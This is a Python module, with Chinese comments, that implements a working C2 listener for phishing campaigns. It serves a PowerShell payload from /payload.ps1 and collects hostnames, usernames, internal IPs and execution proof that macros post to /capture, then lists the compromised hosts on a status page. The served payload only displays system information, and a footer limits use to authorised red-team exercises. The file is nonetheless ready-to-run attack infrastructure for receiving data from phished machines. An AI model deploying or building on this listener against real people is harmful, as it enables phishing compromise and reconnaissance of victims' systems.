"""
简易 C2 监听器 — 社工钓鱼回传接收

端点:
  GET  /payload.ps1   → 返回测试用 PowerShell 脚本（输出提示信息）
  POST /capture        → 接收宏发送的主机信息，存储到内存列表

使用:
  python -m security_log_analyzer.c2_listener          # 默认 0.0.0.0:8080
  python -m security_log_analyzer.c2_listener --port 9000
"""

from __future__ import annotations

import argparse
import json
import socket
import sys
import threading
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any
from urllib.parse import parse_qs

# ── 全局状态 ────────────────────────────────────────────

captured_hosts: list[dict[str, Any]] = []
"""接收到的钓鱼回调记录"""


def get_local_ip() -> str:
    """获取本机局域网 IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


# ── PowerShell Payload ───────────────────────────────────

PAYLOAD_PS1 = r"""
Write-Host "=== RedTeam Simulation Payload ===" -ForegroundColor Green
Write-Host "Target: $env:COMPUTERNAME"
Write-Host "User: $env:USERNAME"
Write-Host "OS: $env:OS"
Write-Host ""
Write-Host "This is a harmless simulation payload."
Write-Host "No files are modified, deleted, or encrypted."
Write-Host "This payload only collects and displays system info."
Write-Host ""
Write-Host "=== Network Info ==="
Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object IPAddress, InterfaceAlias
Write-Host ""
Write-Host "=== Running Processes (top 5) ==="
Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 | Format-Table Name, CPU, Id -AutoSize
"""


# ── HTTP 请求处理器 ─────────────────────────────────────

class C2Handler(BaseHTTPRequestHandler):
    """C2 HTTP 请求处理"""

    def log_message(self, format: str, *args: Any) -> None:
        """自定义日志格式"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] {args[0]}")

    def do_GET(self) -> None:
        """GET 请求处理"""
        if self.path == "/payload.ps1":
            self._serve_payload()
        elif self.path == "/" or self.path == "/status":
            self._serve_status()
        else:
            self.send_error(404)

    def do_POST(self) -> None:
        """POST 请求处理 — 接收回调信息"""
        if self.path == "/capture":
            self._handle_capture()
        else:
            self.send_error(404)

    def _serve_payload(self) -> None:
        """返回 PowerShell 测试 payload"""
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Disposition", 'attachment; filename="payload.ps1"')
        self.end_headers()
        self.wfile.write(PAYLOAD_PS1.encode("utf-8"))

    def _serve_status(self) -> None:
        """返回 C2 状态页面"""
        html = f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta http-equiv="refresh" content="5">
    <title>C2 监听器状态</title>
    <style>
        body {{ font-family: monospace; max-width: 800px; margin: 20px auto; padding: 0 15px; }}
        h1 {{ color: #333; }}
        table {{ border-collapse: collapse; width: 100%; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background: #4CAF50; color: white; }}
        .summary {{ background: #f0f0f0; padding: 10px; border-radius: 5px; margin: 15px 0; }}
    </style>
</head>
<body>
    <h1>🎯 C2 监听器 — 运行中</h1>
    <div class="summary">
        <strong>监听地址:</strong> {self.server.server_address[0]}:{self.server.server_address[1]}<br>
        <strong>回调总数:</strong> {len(captured_hosts)}<br>
        <strong>回传端点:</strong> POST /capture<br>
        <strong>Payload 端点:</strong> GET /payload.ps1
    </div>
    <h2>回调记录</h2>
    {self._build_table()}
    <hr>
    <small>仅供授权的红蓝对抗 / 安全研究使用。未经授权使用属于违法行为。</small>
</body>
</html>"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode("utf-8"))

    def _build_table(self) -> str:
        """构建回调记录表格"""
        if not captured_hosts:
            return "<p><em>尚无回调记录</em></p>"

        rows = []
        for i, host_info in enumerate(reversed(captured_hosts[-20:])):
            rows.append(
                f"<tr>"
                f"<td>{i + 1}</td>"
                f"<td>{host_info.get('hostname', '?')}</td>"
                f"<td>{host_info.get('username', '?')}</td>"
                f"<td>{host_info.get('internal_ip', '?')}</td>"
                f"<td>{host_info.get('timestamp', '?')}</td>"
                f"</tr>"
            )

        return (
            "<table>"
            "<tr><th>#</th><th>主机名</th><th>用户名</th><th>内网IP</th><th>时间</th></tr>"
            + "".join(rows)
            + "</table>"
        )

    def _handle_capture(self) -> None:
        """处理 /capture POST 回调"""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace")

        # 支持 JSON 和 form-urlencoded 两种格式
        data: dict[str, str] = {}
        content_type = self.headers.get("Content-Type", "")

        if "json" in content_type:
            try:
                data = json.loads(body)
            except json.JSONDecodeError:
                data = {"raw": body}
        else:
            parsed = parse_qs(body)
            for k, v in parsed.items():
                data[k] = v[0] if v else ""

        host_info: dict[str, Any] = {
            "hostname": data.get("hostname", "unknown"),
            "username": data.get("username", "unknown"),
            "internal_ip": data.get("internal_ip", "unknown"),
            "os": data.get("os", "unknown"),
            "exec_proof": data.get("exec_proof", ""),
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "source_ip": self.client_address[0],
            "user_agent": self.headers.get("User-Agent", ""),
        }
        captured_hosts.append(host_info)

        print(f"\n{'='*50}")
        print(f"[+] 收到回调 #{len(captured_hosts)}")
        print(f"    主机名:   {host_info['hostname']}")
        print(f"    用户名:   {host_info['username']}")
        print(f"    内网IP:   {host_info['internal_ip']}")
        print(f"    来源IP:   {host_info['source_ip']}")
        print(f"    时间:     {host_info['timestamp']}")
        print(f"{'='*50}\n")

        # 返回确认
        response = json.dumps({"status": "ok", "id": len(captured_hosts)})
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(response.encode("utf-8"))


# ── 入口 ─────────────────────────────────────────────────

def start_c2_listener(host: str = "0.0.0.0", port: int = 8080) -> HTTPServer:
    """启动 C2 监听器（阻塞）"""
    server = HTTPServer((host, port), C2Handler)
    local_ip = get_local_ip()

    def _safe(msg: str) -> None:
        try:
            print(msg)
        except UnicodeEncodeError:
            print(msg.encode("gbk", errors="replace").decode("gbk"))

    _safe("=" * 50)
    _safe("[*] C2 Listener Started")
    _safe("=" * 50)
    _safe(f"  Listen:      http://{host}:{port}")
    _safe(f"  Local IP:    {local_ip}")
    _safe(f"  Status:      http://{local_ip}:{port}/")
    _safe(f"  Payload:     http://{local_ip}:{port}/payload.ps1")
    _safe(f"  Capture:     POST http://{local_ip}:{port}/capture")
    _safe(f"  C2 URL:      http://{local_ip}:{port}/capture")
    _safe("=" * 50)
    _safe("  Press Ctrl+C to stop")
    _safe("=" * 50)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nC2 监听器已停止")
        print(f"共收到 {len(captured_hosts)} 次回调")
        server.shutdown()
    return server


def start_c2_background(host: str = "0.0.0.0", port: int = 8080) -> tuple[HTTPServer, threading.Thread]:
    """在后台线程启动 C2 监听器，返回 (server, thread)"""
    server = HTTPServer((host, port), C2Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    local_ip = get_local_ip()
    print(f"[C2] 后台监听 http://{local_ip}:{port}")
    print(f"[C2] 回调端点: POST http://{local_ip}:{port}/capture")
    return server, thread


def get_captured_hosts() -> list[dict[str, Any]]:
    """获取已捕获的主机信息列表"""
    return list(captured_hosts)


def clear_captured_hosts() -> None:
    """清空回调记录"""
    captured_hosts.clear()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="C2 监听器 — 社工钓鱼回传接收")
    parser.add_argument("--host", default="0.0.0.0", help="监听地址 (默认 0.0.0.0)")
    parser.add_argument("--port", type=int, default=8080, help="监听端口 (默认 8080)")
    args = parser.parse_args()

    start_c2_listener(host=args.host, port=args.port)
